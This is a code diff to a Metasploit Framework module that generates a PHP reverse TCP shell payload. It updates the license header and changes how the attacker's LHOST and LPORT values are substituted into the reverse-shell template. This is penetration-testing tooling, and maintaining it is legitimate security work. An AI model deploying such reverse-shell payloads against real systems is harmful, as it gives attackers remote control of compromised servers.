@@ -5,8 +5,8 @@
 ##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
 
 require 'msf/core'
@@ -38,17 +38,9 @@ module Metasploit3
 	# Constructs the payload
 	#
 	def generate
-		if (datastore['LHOST'] and not datastore['LHOST'].empty?)
-			lhost = datastore['LHOST']
-			lport = datastore['LPORT']
-		else
-			lhost = '127.0.0.1'
-			lport = '4444'
-		end
-
 		reverse = File.read(File.join(Msf::Config::InstallRoot, 'data', 'php', 'reverse_tcp.php'))
-		reverse.gsub!("127.0.0.1", lhost)
-		reverse.gsub!("4444", lport)
+		reverse.gsub!("127.0.0.1", "#{datastore["LHOST"]}")
+		reverse.gsub!("4444", "#{datastore["LPORT"]}")
 		#reverse.gsub!(/#.*$/, '')
 		#reverse = Rex::Text.compress(reverse)
 
